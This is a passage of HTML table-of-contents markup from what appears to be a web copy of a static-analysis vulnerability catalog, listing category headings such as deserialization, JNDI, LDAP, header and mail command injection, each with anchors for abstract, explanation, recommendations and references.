toc-level-5"><a class="toc-link" href="#EXPLANATION-266"><span class="toc-number">1.6.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-265"><span class="toc-number">1.6.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-264"><span class="toc-number">1.6.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Parse-Double"><span class="toc-number">1.6.16.</span> <span class="toc-text">Denial of Service: Parse Double</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-266"><span class="toc-number">1.6.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-267"><span class="toc-number">1.6.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-266"><span class="toc-number">1.6.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-265"><span class="toc-number">1.6.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Regular-Expression"><span class="toc-number">1.6.17.</span> <span class="toc-text">Denial of Service: Regular Expression</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-267"><span class="toc-number">1.6.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-268"><span class="toc-number">1.6.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-267"><span class="toc-number">1.6.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-266"><span class="toc-number">1.6.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-StringBuilder"><span class="toc-number">1.6.18.</span> <span class="toc-text">Denial of Service: StringBuilder</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-268"><span class="toc-number">1.6.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-269"><span class="toc-number">1.6.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-268"><span class="toc-number">1.6.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-267"><span class="toc-number">1.6.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Deserialization-Bad-Practice-Blacklist"><span class="toc-number">1.6.19.</span> <span class="toc-text">Deserialization Bad Practice: Blacklist</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-269"><span class="toc-number">1.6.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-270"><span class="toc-number">1.6.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-269"><span class="toc-number">1.6.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-268"><span class="toc-number">1.6.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Injection"><span class="toc-number">1.6.20.</span> <span class="toc-text">Dynamic Code Evaluation: Code Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-270"><span class="toc-number">1.6.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-271"><span class="toc-number">1.6.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-270"><span class="toc-number">1.6.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-269"><span class="toc-number">1.6.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Manipulation"><span class="toc-number">1.6.21.</span> <span class="toc-text">Dynamic Code Evaluation: Code Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-271"><span class="toc-number">1.6.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-272"><span class="toc-number">1.6.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-271"><span class="toc-number">1.6.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-270"><span class="toc-number">1.6.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-JNDI-Reference-Injection"><span class="toc-number">1.6.22.</span> <span class="toc-text">Dynamic Code Evaluation: JNDI Reference Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-272"><span class="toc-number">1.6.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-273"><span class="toc-number">1.6.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-272"><span class="toc-number">1.6.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-271"><span class="toc-number">1.6.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Script-Injection"><span class="toc-number">1.6.23.</span> <span class="toc-text">Dynamic Code Evaluation: Script Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-273"><span class="toc-number">1.6.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-274"><span class="toc-number">1.6.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-273"><span class="toc-number">1.6.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-272"><span class="toc-number">1.6.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-Deserialization"><span class="toc-number">1.6.24.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-274"><span class="toc-number">1.6.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-275"><span class="toc-number">1.6.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-274"><span class="toc-number">1.6.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-273"><span class="toc-number">1.6.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-JSON-Deserialization"><span class="toc-number">1.6.25.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe JSON Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-275"><span class="toc-number">1.6.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-276"><span class="toc-number">1.6.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-275"><span class="toc-number">1.6.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-274"><span class="toc-number">1.6.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-XStream-Deserialization"><span class="toc-number">1.6.26.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe XStream Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-276"><span class="toc-number">1.6.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-277"><span class="toc-number">1.6.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-276"><span class="toc-number">1.6.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-275"><span class="toc-number">1.6.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-XMLDecoder-Injection"><span class="toc-number">1.6.27.</span> <span class="toc-text">Dynamic Code Evaluation: XMLDecoder Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-277"><span class="toc-number">1.6.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-278"><span class="toc-number">1.6.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-277"><span class="toc-number">1.6.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-276"><span class="toc-number">1.6.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Expression-Language-Injection-Spring"><span class="toc-number">1.6.28.</span> <span class="toc-text">Expression Language Injection: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-278"><span class="toc-number">1.6.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-279"><span class="toc-number">1.6.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-278"><span class="toc-number">1.6.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-277"><span class="toc-number">1.6.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Permission-Manipulation"><span class="toc-number">1.6.29.</span> <span class="toc-text">File Permission Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-279"><span class="toc-number">1.6.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-280"><span class="toc-number">1.6.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-279"><span class="toc-number">1.6.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-278"><span class="toc-number">1.6.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Formula-Injection"><span class="toc-number">1.6.30.</span> <span class="toc-text">Formula Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-280"><span class="toc-number">1.6.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-281"><span class="toc-number">1.6.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-280"><span class="toc-number">1.6.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-279"><span class="toc-number">1.6.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-Parameter-Pollution"><span class="toc-number">1.6.31.</span> <span class="toc-text">HTTP Parameter Pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-281"><span class="toc-number">1.6.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-282"><span class="toc-number">1.6.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-281"><span class="toc-number">1.6.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-280"><span class="toc-number">1.6.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hadoop-Cluster-Manipulation"><span class="toc-number">1.6.32.</span> <span class="toc-text">Hadoop Cluster Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-282"><span class="toc-number">1.6.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-283"><span class="toc-number">1.6.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-282"><span class="toc-number">1.6.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-281"><span class="toc-number">1.6.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hadoop-Job-Manipulation"><span class="toc-number">1.6.33.</span> <span class="toc-text">Hadoop Job Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-283"><span class="toc-number">1.6.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-284"><span class="toc-number">1.6.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-283"><span class="toc-number">1.6.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-282"><span class="toc-number">1.6.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation"><span class="toc-number">1.6.34.</span> <span class="toc-text">Header Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-284"><span class="toc-number">1.6.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-285"><span class="toc-number">1.6.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-284"><span class="toc-number">1.6.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-283"><span class="toc-number">1.6.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-Cookies"><span class="toc-number">1.6.35.</span> <span class="toc-text">Header Manipulation: Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-285"><span class="toc-number">1.6.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-286"><span class="toc-number">1.6.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-285"><span class="toc-number">1.6.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-284"><span class="toc-number">1.6.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-SMTP"><span class="toc-number">1.6.36.</span> <span class="toc-text">Header Manipulation: SMTP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-286"><span class="toc-number">1.6.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-287"><span class="toc-number">1.6.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-286"><span class="toc-number">1.6.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-285"><span class="toc-number">1.6.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Sanitizer-Policy"><span class="toc-number">1.6.37.</span> <span class="toc-text">Insecure Sanitizer Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-287"><span class="toc-number">1.6.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-288"><span class="toc-number">1.6.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-287"><span class="toc-number">1.6.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-286"><span class="toc-number">1.6.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Intent-Manipulation"><span class="toc-number">1.6.38.</span> <span class="toc-text">Intent Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-288"><span class="toc-number">1.6.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-289"><span class="toc-number">1.6.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-288"><span class="toc-number">1.6.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-287"><span class="toc-number">1.6.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-Injection"><span class="toc-number">1.6.39.</span> <span class="toc-text">JSON Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-289"><span class="toc-number">1.6.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-290"><span class="toc-number">1.6.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-289"><span class="toc-number">1.6.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-288"><span class="toc-number">1.6.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Entry-Poisoning"><span class="toc-number">1.6.40.</span> <span class="toc-text">LDAP Entry Poisoning</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-290"><span class="toc-number">1.6.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-291"><span class="toc-number">1.6.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-290"><span class="toc-number">1.6.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-289"><span class="toc-number">1.6.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Injection"><span class="toc-number">1.6.41.</span> <span class="toc-text">LDAP Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-291"><span class="toc-number">1.6.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-292"><span class="toc-number">1.6.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-291"><span class="toc-number">1.6.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-290"><span class="toc-number">1.6.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-Manipulation"><span class="toc-number">1.6.42.</span> <span class="toc-text">LDAP Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-292"><span class="toc-number">1.6.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-293"><span class="toc-number">1.6.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-292"><span class="toc-number">1.6.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-291"><span class="toc-number">1.6.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging"><span class="toc-number">1.6.43.</span> <span class="toc-text">Log Forging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-293"><span class="toc-number">1.6.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-294"><span class="toc-number">1.6.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-293"><span class="toc-number">1.6.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-292"><span class="toc-number">1.6.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging-debug"><span class="toc-number">1.6.44.</span> <span class="toc-text">Log Forging (debug)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-294"><span class="toc-number">1.6.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-295"><span class="toc-number">1.6.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-294"><span class="toc-number">1.6.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-293"><span class="toc-number">1.6.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-IMAP"><span class="toc-number">1.6.45.</span> <span class="toc-text">Mail Command Injection: IMAP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-295"><span class="toc-number">1.6.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-296"><span class="toc-number">1.6.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-295"><span class="toc-number">1.6.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-294"><span class="toc-number">1.6.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-POP3"><span class="toc-number">1.6.46.</span> <span class="toc-text">Mail Command Injection: POP3</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-296"><span class="toc-number">1.6.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-297"><span class="toc-number">1.6.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-296"><span class="toc-number">1.6.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-295"><span class="toc-number">1.6.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mail-Command-Injection-SMTP"><span class="toc-number">1.6.47.</span> <span class="toc-text">Mail Command Injection: SMTP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-297"><span class="toc-number">1.6.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-298"><span class="toc-number">1.6.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-297"><span class="toc-number">1.6.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-296"><span class="toc-number">1.6.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-XML-Validation"><span class="toc-number">1.6.48.</span> <span class="toc-text">Missing XML Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-298"><span class="toc-number">1.6.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-299"><span class="toc-number">1.6.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-298"><span class="toc-number">1.6.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-297"><span class="toc-number">1.6.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-XML-Validation-Untyped-Response"><span class="toc-number">1.6.49.</span> <span class="toc-text">Missing XML Validation: Untyped Response</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-299"><span class="toc-number">1.6.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-300"><span class="toc-number">1.6.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-299"><span class="toc-number">1.6.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-298"><span class="toc-number">1.6.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#OGNL-Expression-Injection"><span class="toc-number">1.6.50.</span> <span class="toc-text">OGNL Expression Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-300"><span class="toc-number">1.6.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-301"><span class="toc-number">1.6.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-300"><span 